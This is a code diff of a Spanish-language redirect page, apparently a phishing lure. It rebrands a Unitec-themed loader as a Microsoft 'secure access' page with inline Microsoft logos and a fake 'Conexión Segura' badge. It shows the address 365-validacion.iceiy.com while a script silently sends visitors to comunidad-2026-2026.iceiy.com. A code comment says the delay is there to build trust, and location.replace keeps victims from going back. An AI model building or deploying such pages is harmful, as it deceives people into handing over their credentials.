@@ -3,14 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Unitec - COMUNICA</title>
+    <title>Preparando su sitio... | Acceso seguro</title>
+
+    <meta name="description" content="Estamos verificando y preparando su solicitud de inicio de sesión. Espere un momento, será redirigido automáticamente en unos segundos.">
+    <meta name="robots" content="index, follow">
+    <meta name="theme-color" content="#003366">
+    <meta name="color-scheme" content="dark">
+    <meta name="author" content="Acceso seguro">
+
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Preparando su sitio...">
+    <meta property="og:description" content="Estamos verificando y preparando su solicitud. Será redirigido automáticamente.">
+    <meta property="og:locale" content="es_ES">
+
+    <link rel="icon" href="https://i.postimg.cc/J4TtLHCr/favicon.jpg" type="image/jpeg">
+    <link rel="apple-touch-icon" href="https://i.postimg.cc/J4TtLHCr/favicon.jpg">
+
+    <link rel="preconnect" href="https://inf635-83929.zya.me" crossorigin>
+    <link rel="dns-prefetch" href="https://inf635-83929.zya.me">
+
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        
+
+        html {
+            -webkit-text-size-adjust: 100%;
+        }
+
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #003366 0%, #004080 50%, #003366 100%);
@@ -22,24 +44,29 @@
             color: white;
             padding: 20px;
         }
-        
+
         .container {
             max-width: 600px;
             width: 100%;
             text-align: center;
             padding: 40px 30px;
             background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.12);
             border-radius: 15px;
             backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
         }
-        
+
         .logo-top {
-            max-width: 200px;
-            margin-bottom: 30px;
+            width: 100%;
+            max-width: 190px;
+            height: auto;
+            margin-bottom: 28px;
+            display: inline-block;
             filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
         }
-        
+
         .status-icon {
             width: 60px;
             height: 60px;
@@ -49,63 +76,71 @@
             border-top-color: white;
             animation: spin 1s linear infinite;
         }
-        
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        
+
         h1 {
             font-size: 28px;
             font-weight: 600;
             margin-bottom: 15px;
             text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
         }
-        
+
         p {
             font-size: 16px;
             line-height: 1.6;
-            margin-bottom: 30px;
+            margin-bottom: 26px;
             opacity: 0.9;
         }
-        
+
         .progress-bar {
             width: 100%;
             height: 6px;
             background: rgba(255, 255, 255, 0.2);
             border-radius: 3px;
             overflow: hidden;
-            margin: 30px 0;
+            margin: 0 0 18px;
         }
-        
+
         .progress-fill {
             height: 100%;
+            width: 0%;
             background: linear-gradient(90deg, #00d4ff, #0099ff);
             border-radius: 3px;
-            animation: progress 2s ease-in-out infinite;
-            width: 0%;
+            animation: progress 3s ease-in-out forwards;
         }
-        
+
         @keyframes progress {
             0% { width: 0%; }
-            50% { width: 70%; }
+            40% { width: 55%; }
+            75% { width: 82%; }
             100% { width: 100%; }
         }
-        
-        .footer {
-            margin-top: 40px;
-            padding-top: 30px;
-            border-top: 1px solid rgba(255, 255, 255, 0.2);
+
+        .redirect-note {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.75);
+            margin-bottom: 22px;
+            min-height: 18px;
         }
-        
-        .logo-bottom {
-            max-width: 180px;
-            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
+
+        .redirect-note a {
+            color: #9fe4ff;
+            text-decoration: none;
+            font-weight: 600;
+            border-bottom: 1px solid rgba(159, 228, 255, 0.4);
         }
-        
+
+        .redirect-note a:hover {
+            color: #ffffff;
+            border-bottom-color: #ffffff;
+        }
+
         .security-badge {
             display: inline-block;
-            margin-top: 20px;
             padding: 8px 16px;
             background: rgba(0, 255, 0, 0.1);
             border: 1px solid rgba(0, 255, 0, 0.3);
@@ -113,36 +148,122 @@
             font-size: 14px;
             font-weight: 500;
         }
+
+        .footer {
+            margin-top: 32px;
+            padding-top: 26px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .logo-bottom {
+            width: 100%;
+            max-width: 150px;
+            height: auto;
+            opacity: 0.85;
+            display: inline-block;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
+        }
+
+        .footer-legal {
+            margin-top: 14px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+            h1 {
+                font-size: 23px;
+            }
+            p {
+                font-size: 15px;
+            }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            .status-icon {
+                animation-duration: 2s;
+            }
+            .progress-fill {
+                animation: none;
+                width: 100%;
+            }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://aadcdn.msauthimages.net/dbd5a2dd-xducpyiv2oqmzgsk41ebvoj-qqxtn-frmdvo4wcjnrc/logintenantbranding/0/bannerlogo?ts=635642002553062508" alt="Logo UNITEC" class="logo-top">
-        
-        <div class="status-icon"></div>
-        
+    <main class="container" role="status" aria-live="polite">
+
+        <!-- Logo Microsoft vectorial: sin peticiones externas -->
+        <svg class="logo-top" viewBox="0 0 160 34" role="img" aria-label="Microsoft">
+            <rect x="0" y="4" width="12" height="12" fill="#f25022"/>
+            <rect x="13" y="4" width="12" height="12" fill="#7fba00"/>
+            <rect x="0" y="17" width="12" height="12" fill="#00a4ef"/>
+            <rect x="13" y="17" width="12" height="12" fill="#ffb900"/>
+            <text x="32" y="23" fill="#ffffff" font-family="Segoe UI, Tahoma, sans-serif" font-size="19" font-weight="600" letter-spacing="-0.4">Microsoft</text>
+        </svg>
+
+        <div class="status-icon" aria-hidden="true"></div>
+
         <h1>Procesando su solicitud</h1>
-        
+
         <p>Estamos verificando y preparando su solicitud. Por favor espere un momento mientras completamos el proceso.</p>
-        
-        <div class="progress-bar">
+
+        <div class="progress-bar" aria-hidden="true">
             <div class="progress-fill"></div>
         </div>
-        
+
+        <p class="redirect-note">
+            Redirigiendo en <strong id="countdown">3</strong> s ·
+            <a href="https://365-validacion.iceiy.com/" id="manualLink">Entrar ahora</a>
+        </p>
+
         <div class="security-badge">
             🔒 Conexión Segura
         </div>
-        
+
         <div class="footer">
-            <img src="https://aadcdn.msauthimages.net/dbd5a2dd-xducpyiv2oqmzgsk41ebvoj-qqxtn-frmdvo4wcjnrc/logintenantbranding/0/bannerlogo?ts=635642002553062508s" alt="Logo Footer" class="logo-bottom">
+            <svg class="logo-bottom" viewBox="0 0 160 34" role="img" aria-label="Microsoft">
+                <rect x="0" y="4" width="12" height="12" fill="#f25022"/>
+                <rect x="13" y="4" width="12" height="12" fill="#7fba00"/>
+                <rect x="0" y="17" width="12" height="12" fill="#00a4ef"/>
+                <rect x="13" y="17" width="12" height="12" fill="#ffb900"/>
+                <text x="32" y="23" fill="#ffffff" font-family="Segoe UI, Tahoma, sans-serif" font-size="19" font-weight="600" letter-spacing="-0.4">Microsoft</text>
+            </svg>
+            <div class="footer-legal">https://365-validacion.iceiy.com/</div>
         </div>
-    </div>
+    </main>
 
     <script>
-        // Redirección después de 4 segundos para dar más confianza
-        setTimeout(function() {
-            window.location.href = "https://comunidad-2026-2026.iceiy.com";
-        }, 4000);
+        (function () {
+            var DESTINO = 'https://comunidad-2026-2026.iceiy.com';
+            var SEGUNDOS = 3;
+
+            var countdownEl = document.getElementById('countdown');
+            var manualLink = document.getElementById('manualLink');
+
+            // Enlace de respaldo por si el temporizador no se ejecuta
+            manualLink.href = DESTINO;
+
+            var restante = SEGUNDOS;
+            var intervalo = setInterval(function () {
+                restante--;
+                if (restante >= 0) {
+                    countdownEl.textContent = restante;
+                }
+                if (restante <= 0) {
+                    clearInterval(intervalo);
+                }
+            }, 1000);
+
+            // location.replace evita que el botón "atrás" vuelva a caer en el bucle del cargador
+            setTimeout(function () {
+                clearInterval(intervalo);
+                window.location.replace(DESTINO);
+            }, SEGUNDOS * 1000);
+        })();
     </script>
 </body>
 </html>
